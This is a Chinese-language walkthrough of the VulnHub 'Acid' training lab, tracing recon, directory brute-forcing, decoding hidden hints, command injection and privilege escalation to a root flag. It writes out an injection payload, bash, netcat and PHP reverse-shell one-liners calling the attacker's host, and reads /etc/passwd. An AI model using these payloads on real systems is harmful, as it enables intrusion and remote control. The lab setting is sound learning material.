注：本文主要详细解释每一步思路及原理。

## 目标

获得目标root权限及flag

## 运行环境

kali: 192.168.174.129目标机: 192.168.174.130

## 靶机下载

> <https://download.vulnhub.com/acid/Acid.rar>

## 信息收集

首先需要知道本机(kali)和靶机的IP，所以打开终端(terminal)，输入ifconfig，查看ip信息![alt
ifconfig.png](https://image.3001.net/images/20191011/1570784849_5da046516f299.png!small)这里知道了本机ip为192.168.174.129

因为kali和靶机都是用VMware打开的虚拟机，所以扫描一下局域网就能找到靶机地址了

    
    
    > nmap -sP 192.168.174.0/24
    

> -sP ping扫描，用ping方式检查网络上哪些主机正在运行。nmap在任何情况下都会进行ping扫描，只有目标主机处于运行状态，才会进行后续的扫描。
>
> /24 为子网掩码 = 255.255.255.0

![alt nmap
-sP.png](https://image.3001.net/images/20191011/1570784862_5da0465e1b072.png!small)两虚拟机都是NAT连接方式，否则可能扫描不到知道了靶机ip为192.168.174.130，现在需要看看它开了哪些端口

    
    
    > nmap -p 1-65535 192.168.174.130   
    > nmap -p- 192.168.174.130
    

> -p 后面指定端口号，扫描1到65535所有端口，也可以简写为 -p-![alt nmap
> -p-.png](https://image.3001.net/images/20191011/1570784868_5da04664d5372.png!small)

只有33447这一个端口开放，不知道是什么服务从浏览器直接访问 192.168.174.130:33447发现了主页面

![alt
html.png](https://image.3001.net/images/20191011/1570784874_5da0466adaa80.png!small)

## 漏洞挖掘的详细思路

网页上没有找到下手的地方，直接f12看源码，发现html最后有一行奇怪的编码  
![alt
html_hack.png](https://image.3001.net/images/20191011/1570784879_5da0466f2c8cc.png!small)

看见0x怀疑是十六进制，拿去转码

![alt
hex_str.png](https://image.3001.net/images/20191011/1570784882_5da04672c12c0.png!small)

转码之后又是另一种编码，又"="怀疑是base64，数一下长度为3的倍数，肯定是了，继续用base64解码

![alt
base64.png](https://image.3001.net/images/20191011/1570784886_5da04676c636f.png!small)

得到了wow.jpg的提示，url直接访问192.168.174.130:33447/wow.jpg ，发现并没有这个路径但是发现了主页的网页标题有提示

![alt
/Challenge.png](https://image.3001.net/images/20191011/1570784890_5da0467abb057.png!small)

提示/Challenge这个目录，记住这个目录，然后就直接爆破根目录吧

    
    
     > dirb 192.168.174.130:33447 /usr/share/dirb/wordlists/common.txt
    

> dirb + 需要爆破的地址 + 字典
>
> 字典在/usr/share/dirb/wordlists/目录下就有很多，包括common.txt，big.txt 等等，可以亲自去翻一翻

![alt
dirb.png](https://image.3001.net/images/20191011/1570784894_5da0467ed4d2e.png!small)

发现了images这个目录，然后试一下/images/wow.jpg，果然藏在这里

![alt
wow.jpg](https://image.3001.net/images/20191011/1570784898_5da04682395fe.png!small)

这应该是考验隐写术了，先把保存下来用binwalk分析一下，发现是个gif 那就重新存为gif后缀

![alt
gif.png](https://image.3001.net/images/20191011/1570784903_5da046873d8a6.png!small)

![alt
save.png](https://image.3001.net/images/20191011/1570784907_5da0468b3bcef.png!small)

> Binwalk 是用于搜索给定二进制镜像文件以获取嵌入的文件和代码的工具。 具体来说,它被设计用于识别嵌入固件镜像内的文件和代码。  
> 执行" binwalk 所要查看的文件的路径" ，得到文件中包含的其他文件的信息  
> 执行“ binwalk -e 文件路径 ”，得到分离后的文件。

看到gif我首先怀疑在其它帧里面藏着东西，用图片神器Stegsolve打开

![alt
stegsolve.png](https://image.3001.net/images/20191011/1570784911_5da0468f5155f.png!small)

    
    
    点击 Analyes -> Frame Browser 查看gif的每一帧
    

![alt
stegsole_gif.png](https://image.3001.net/images/20191011/1570784915_5da04693b0087.png!small)

发现只有一帧，应该没有隐藏东西，顺便看看色彩通道什么的，也什么都没有再去看看十六进制

    
    
     在终端输入hexeditor打开kali自带的十六进制编辑器
    

![alt
hexeditor.png](https://image.3001.net/images/20191011/1570784933_5da046a5ec504.png!small)

选择刚才的gif对比文件头为 47 49 46 38，没有问题

![alt
16.png](https://image.3001.net/images/20191011/1570784938_5da046aac19b6.png!small)

## 常用文件头文件尾

文件格式 | 文件头 | 文件尾  
---|---|---  
JPEG (jpg) | FF D8 FF | FF D9  
PNG (png) | 89 50 4E 47 | AE 42 60 82  
GIF (gif) | 47 49 46 38 | 00 3B  
ZIP Archive (zip) | 50 4B 03 04 | 50 4B  
RAR Archive (rar) | 52 61 72 21  
avi | 41 56 49 20  
  
可以用ctrl + w
搜索关键词，说不定是几张图片糅合在一起，或者ascii值里面有ctf，flag等关键字，当然最后发现都没有结果在最后面发现了一行奇怪的编码

![alt
17.png](https://image.3001.net/images/20191011/1570784944_5da046b071125.png!small)

看这些数字的大小怀疑是ascii，因为ascii和url编码是一样的，所以我就写了个python方法把“:”换成了“%”拿去url解码了

这里说一下，其实用文本编辑器打开图片复制最后一行编码更方便

![alt
18.png](https://image.3001.net/images/20191011/1570784948_5da046b4d3083.png!small)

![alt
19.png](https://image.3001.net/images/20191011/1570784953_5da046b9bb72f.png!small)

解出来是一个字符串，拿去python里看看长度

![alt
20.png](https://image.3001.net/images/20191011/1570784959_5da046bf11f8b.png!small)

32位，应该是md5加密吧

![alt
21.png](https://image.3001.net/images/20191011/1570784963_5da046c37b78d.png!small)

得到63425这个密码，也不知道有啥用，先留着吧想到之前还有一个/Challenge目录的提示，访问一下试试看

    
    
    192.168.174.130:33447/Challenge/
    

![alt
22.png](https://image.3001.net/images/20191011/1570784968_5da046c82edbd.png!small)

果然是可以访问的，用dirbuster扫描后台看看还有什么目录

![alt
23.png](https://image.3001.net/images/20191011/1570784972_5da046ccd3690.png!small)就设置一下爆破站点，线程200就好了，字典在/usr/share/dirbuster/wordlists/目录下，爆破目标目录的设置注意{dir}才是从字典里面匹配的，所以得加后缀php之类的，还有start按钮一般是在右下角隐藏了，拖拽一下边框就出来了

![alt
24.png](https://image.3001.net/images/20191011/1570784977_5da046d11a2b4.png!small)

跑出来了5个目录cake.php, error.php, hacked.php, index.php, include.php

index.php![alt
index.php](https://image.3001.net/images/20191011/1570784982_5da046d6a4dc9.png!small)  
首页需要email和password才能登陆

hacked.php  
![alt
hacked.php](https://image.3001.net/images/20191011/1570784988_5da046dc33ef5.png!small)  
需要id，把之前的63425放进去，然而并没有什么用  
![alt
hacked1.php](https://image.3001.net/images/20191011/1570784993_5da046e139c25.png!small)  
用sqlmap对参数id进行注入似乎也失败了

cake.php  
![alt
cake.php](https://image.3001.net/images/20191011/1570784997_5da046e5e53cd.png!small)  
貌似标题上有提示，在/Magic_Box目录下再爆一次目录  
![alt
magic.png](https://image.3001.net/images/20191011/1570785002_5da046ea33635.png!small)得到command.php和low.php两个目录访问发现low是个空白页面，而command是这样的  
![alt
command.png](https://image.3001.net/images/20191011/1570785007_5da046ef7ec7f.png!small)感觉有点像命令执行漏洞，试试127.0.0.1|id，发现有个页面一闪而过，还是抓个包吧  
![alt
31.png](https://image.3001.net/images/20191011/1570785012_5da046f4716af.png!small)

GID为GroupID，即组ID，用来标识用户组的唯一标识符。

UID为UserId，即用户ID，用来标识每个用户的唯一标示符。发现的确是有命令执行漏洞的

## 反弹shell

    
    
    使用反弹shell到7777端口，尝试bash反弹shell和nc反弹shell都失败了
    
    > bash -i >& /dev/tcp/192.168.174.129/7777 0>&1nc -e /bin/bash -d 192.168.174.129 7777
    

> -i interactive。即产生一个交互式的shell（bash）- 0>&1
> 标准输入转换为标准输出，大概意思就是把shell重定向到kali的7777端口
>
> nc -e 程序重定向，把bash程序（linux的默认shell程序）重定向到7777端口- 如果看不懂>&， 0>&1可以先看
> <https://xz.aliyun.com/t/2548>

但是php反弹shell可以成功

    
    
     > php -r '$sock=fsockopen("192.168.174.129",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
    

将上面的payload转换为url编码后用burpsuit发送发送之前在终端内监听7777端口，执行

    
    
     > nc -lvp 7777
    

> -l 监听  
> -v 输出交互或出错信息  
> -p 端口  
> nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。

![alt
32.png](https://image.3001.net/images/20191011/1570785019_5da046fb49aaa.png!small)

![alt
33.png](https://image.3001.net/images/20191011/1570785023_5da046ff7f702.png!small)

成功反弹shell

### 什么是反弹shell？

> 反弹shell（reverse
> shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse
> shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

### 为什么要反弹shell？

> 通常用于被控端因防火墙受限、权限不足、端口被占用等情形。  
>
> 举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？  
> 有如下情况：
    
    
    1.  某客户机中了你的网马，但是它在局域网内，你直接连接不了。  
    2. 目标机器的ip动态改变，你不能持续控制。 
    3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。  
    4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。- 那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。
    【注】:参考https://www.cnblogs.com/iouwenbo/p/11277453.html
    

执行su，但是告诉我must be run from a terminal，必须是终端

在百度上找到了用python模拟成终端的方法

    
    
     > echo "import pty; pty.spawn('/bin/bash')" 
     > /tmp/asdf.py
     > python /tmp/asdf.py
    

![alt
34.png](https://image.3001.net/images/20191011/1570785029_5da04705aff6b.png!small)

useradd 添加用户发现并没有权限，需要提权,尝试了上传一句话，脏牛都失败了

## 提权

    
    
     > cat /etc/passwd
    

> 这个文件中保存的就是系统中所有的用户和用户的主要信息。  
> 每行代表一个用户,"x"代表的是密码标志，而不是真正的密码  
> 0：超级用户 UID,1~499：系统用户（伪用户）UID。这些 UID 是系统保留给系统用户的 UID，也就是说 UID 是 1~499
> 范围内的用户是不能登录系统的，而是用来运行系统或服务的。其中，1~99 是系统保留的账号，系统自动创建；100~499
> 是预留给用户创建账号的。500~65535：普通用户 UID。查看用户，需要注意的用户有root，acid，saman

![alt
35.png](https://image.3001.net/images/20191011/1570785048_5da047189d50c.png!small)

    
    
     > find ./ -user acid 2>/dev/null
    

> 2>/dev/null 就是把错误输入到“黑洞”  
> 斜杠(/)告诉 find 命令搜索 /(根)目录及其所有的子目录。查找每个用户的文件发现了/sbin/raw_vs_isi/hint.pcapng
> 网络流量抓包文件  
> ![alt
> 36.png](https://image.3001.net/images/20191011/1570785053_5da0471dde431.png!small)

用scp方法将流量包下载到本地

    
    
     > scp /sbin/raw_vs_isi/hint.pcapng root@192.168.174.129:/user
    

### scp命令用法

> 将本地复制到远程
>  
>  
>     scp /path/local_filename username@servername:/path
>  
>
> 将远程的复制到本地
>  
>  
>     scp username@servername:/path/filename /tmp/local_destination
>  
>
> 将远程目录下的/path/filename 下载到 /tmp/local_destination下 复制目录 当需要传输目录的时候，仅需要加上参数-> r即可以，例如
>  
>  
>     scp -r username@servername:remote_dir/ /tmp/local_dir
>  
>
> 用wireshark打开，找到saman的密码为1337hax0r

![alt
37.png](https://image.3001.net/images/20191011/1570785059_5da0472337548.png!small)

    
    
     > su saman
    

登录saman账户成功

![alt
38.png](https://image.3001.net/images/20191011/1570785064_5da0472858521.png!small)

再用sudo -i 提权到root，需要再次输入saman的密码

然后就能看见目录下的flag.txt文件了

![alt
39.png](https://image.3001.net/images/20191011/1570785068_5da0472c7c2cd.png!small)

